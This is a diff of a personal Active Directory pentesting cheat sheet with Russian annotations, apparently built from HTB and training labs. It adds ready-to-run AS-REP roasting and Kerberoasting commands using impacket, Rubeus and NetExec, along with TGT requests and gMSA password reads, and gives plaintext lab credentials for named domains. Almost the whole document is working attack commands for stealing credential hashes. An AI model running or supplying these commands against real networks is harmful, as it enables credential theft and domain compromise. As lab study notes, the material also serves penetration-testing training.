@@ -82,16 +82,9 @@
 
 
 # Check list domain
-		
-		
-		
-		nxc smb 192.168.50.0/24 поиск все машин
+				
+		поиск все машин	nxc smb 192.168.50.0/24 
 		nslookup -type=SRV _ldap._tcp.dc._msdcs.game.ru 192.168.50.100 (один из котроллеров для поиска всех котроллеров)
-
-		* Создание krb5.conf и получение tgt и кербероастинг с помощью nxc (https://github.com/Pennyw0rth/NetExec)
-
-		(получение krb5.conf) nxc smb dc01.mirage.htb -d mirage.htb -k --generate-krb5-file krb5.conf
-		sudo mv krb5.conf /etc/krb5.conf
 		
   # (asreproasting)	
   		nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
@@ -107,13 +100,37 @@
 		python3 setup.py install
 
 		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
+		* not_preauth
 
+  		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
+		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
+  		-----Kerberoasting without credentials
+
+  		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
 		
-# (керберостинг с nxc) 
+# (керберостинг)
+		
 		nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
-		# Перечисление учетных записей с привилегиями gMSA
-		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
+		
+		----ntlm
 
+  		impacket-GetUserSPNs -dc-ip 192.168.50.110 vd.local/arly.ayn:Password123 -request
+
+  		-----kerberos
+  
+		impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt
+		export KRB5CCNAME=ryan.naylor.ccache
+		impacket-GetUserSPNs -dc-ip 10.10.11.76 -dc-host dc.voleur.htb voleur.htb/ryan.naylor -k -no-pass -request
+				
+		---nxc -делает все
+  		nxc ldap dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --kerberoasting kerberoastables.txt
+
+  		.\Rubeus.exe kerberoast /stats
+
+  		.\Rubeus.exe kerberoast /nowrap /tgtdeleg
+	
+# Перечисление учетных записей с привилегиями gMSA
+		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
 
 (чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
 		
@@ -323,6 +340,11 @@
   
 		crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 
 
+# Создание krb5.conf и получение tgt и кербероастинг с помощью nxc (https://github.com/Pennyw0rth/NetExec)
+
+		(получение krb5.conf) nxc smb dc01.mirage.htb -d mirage.htb -k --generate-krb5-file krb5.conf
+		sudo mv krb5.conf /etc/krb5.conf
+		
 # Users auth on host
 
   		sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
